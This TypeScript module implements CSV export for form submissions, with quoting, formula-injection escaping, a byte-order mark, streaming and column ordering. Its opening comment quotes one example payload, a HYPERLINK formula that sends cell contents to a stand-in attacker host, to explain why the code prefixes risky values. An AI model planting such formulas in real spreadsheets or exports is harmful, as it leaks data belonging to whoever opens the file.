/**
 * CSV export.
 *
 * Two separate concerns, both easy to get wrong:
 *
 * 1. **CSV quoting** — commas, quotes and newlines inside a value.
 * 2. **Formula injection** — a value that a spreadsheet executes rather than displays.
 *
 * (2) is the dangerous one. Excel, LibreOffice and Google Sheets treat a cell beginning
 * `=`, `+`, `-`, `@`, tab or CR as a formula, so a submitted message of
 * `=HYPERLINK("https://evil.example?x="&A1,"Click")` exfiltrates other cells when the
 * owner opens their own export. Correct CSV quoting does **not** prevent this: the
 * spreadsheet strips the quotes and evaluates what is inside.
 */

/** Characters that make a spreadsheet treat a cell as a formula. */
const FORMULA_PREFIXES = ["=", "+", "-", "@", "\t", "\r"];

/**
 * Neutralise a value that would otherwise be evaluated as a formula.
 *
 * Prefixes with a single quote, which spreadsheets read as "this is text" and do not
 * display as part of the value. Stripping the character instead would silently corrupt
 * legitimate data — a phone number of `+441234567890` or a negative amount `-42`.
 */
export function escapeFormula(value: string): string {
  if (value.length === 0) return value;
  return FORMULA_PREFIXES.some((prefix) => value.startsWith(prefix)) ? `'${value}` : value;
}

/** Quote a single CSV cell, after neutralising formulas. */
export function csvCell(value: unknown): string {
  if (value === null || value === undefined) return "";

  const raw = typeof value === "string" ? value : String(value);
  const safe = escapeFormula(raw);

  // Quote when the value contains a delimiter, a quote, or a line break. Doubling the
  // quote is how CSV escapes a literal quote.
  if (/[",\r\n]/.test(safe)) return `"${safe.replace(/"/g, '""')}"`;
  return safe;
}

export function csvRow(values: unknown[]): string {
  return values.map(csvCell).join(",");
}

/**
 * Byte-order mark.
 *
 * Excel on Windows assumes the system codepage unless a BOM is present, so without this
 * any non-ASCII content — Arabic, accented Latin, emoji — renders as mojibake. Other
 * tools ignore it.
 */
export const UTF8_BOM = "﻿";

export interface CsvSource<T> {
  header: string[];
  /** Pages of rows, so a large export never materialises in memory at once. */
  rows: (cursor: string | null) => Promise<{ items: T[]; nextCursor: string | null }>;
  toRow: (item: T) => unknown[];
}

/**
 * Stream a CSV.
 *
 * Built as a ReadableStream rather than a joined string: an instance with 100k
 * submissions would otherwise have to hold the entire export in the Worker's memory
 * before sending a single byte, which is both a memory limit and a timeout risk.
 */
export function streamCsv<T>(source: CsvSource<T>): ReadableStream<Uint8Array> {
  const encoder = new TextEncoder();
  let cursor: string | null = null;
  let done = false;
  let wroteHeader = false;

  return new ReadableStream({
    async pull(controller) {
      if (!wroteHeader) {
        controller.enqueue(encoder.encode(UTF8_BOM + csvRow(source.header) + "\n"));
        wroteHeader = true;
        return;
      }

      if (done) {
        controller.close();
        return;
      }

      const page = await source.rows(cursor);
      cursor = page.nextCursor;
      if (!cursor) done = true;

      if (page.items.length > 0) {
        const chunk = page.items.map((item) => csvRow(source.toRow(item))).join("\n") + "\n";
        controller.enqueue(encoder.encode(chunk));
      } else if (done) {
        controller.close();
      }
    },
  });
}

/** Metadata columns that precede the flattened form fields. */
export const META_COLUMNS = ["id", "created_at", "status", "waitlist_position", "email"] as const;

/**
 * Decide the column order for a single-form export.
 *
 * Fields the owner configured come first, in the order they configured them, so the
 * spreadsheet matches the form. Anything else a submitter sent — fields added to the
 * HTML but never declared, or left over from an older version of the form — follows in
 * first-seen order, so no data is silently dropped from the export.
 *
 * Only meaningful for a single form: across forms the union of keys is arbitrary, so the
 * all-forms export keeps the raw JSON column instead.
 */
export function buildFieldColumns(
  configuredFieldNames: string[],
  rows: { dataJson: string }[],
): string[] {
  const columns: string[] = [];
  const seen = new Set<string>();

  for (const name of configuredFieldNames) {
    if (!seen.has(name)) {
      seen.add(name);
      columns.push(name);
    }
  }

  for (const row of rows) {
    for (const key of Object.keys(parseData(row.dataJson))) {
      if (!seen.has(key)) {
        seen.add(key);
        columns.push(key);
      }
    }
  }

  return columns;
}

export function parseData(json: string): Record<string, unknown> {
  try {
    const parsed: unknown = JSON.parse(json);
    return typeof parsed === "object" && parsed !== null ? (parsed as Record<string, unknown>) : {};
  } catch {
    return {};
  }
}

/**
 * Render one submission as a row for a flattened, single-form export.
 *
 * Every cell still goes through `csvCell`, so formula escaping applies to the flattened
 * values too — that is the whole point of flattening being a formatting change rather
 * than a separate code path.
 */
export function flattenRow(
  row: {
    id: string;
    createdAt: number;
    status: string;
    waitlistPosition: number | null;
    email: string | null;
    dataJson: string;
  },
  fieldColumns: string[],
): unknown[] {
  const data = parseData(row.dataJson);
  return [
    row.id,
    new Date(row.createdAt).toISOString(),
    row.status,
    row.waitlistPosition ?? "",
    row.email ?? "",
    ...fieldColumns.map((key) => {
      const value = data[key];
      if (value === null || value === undefined) return "";
      // A nested object would stringify as [object Object]; keep it as JSON so the
      // cell is at least readable.
      return typeof value === "object" ? JSON.stringify(value) : value;
    }),
  ];
}

/** Filename-safe timestamp, e.g. `2026-09-17`. */
export function exportDateStamp(now: number = Date.now()): string {
  return new Date(now).toISOString().slice(0, 10);
}
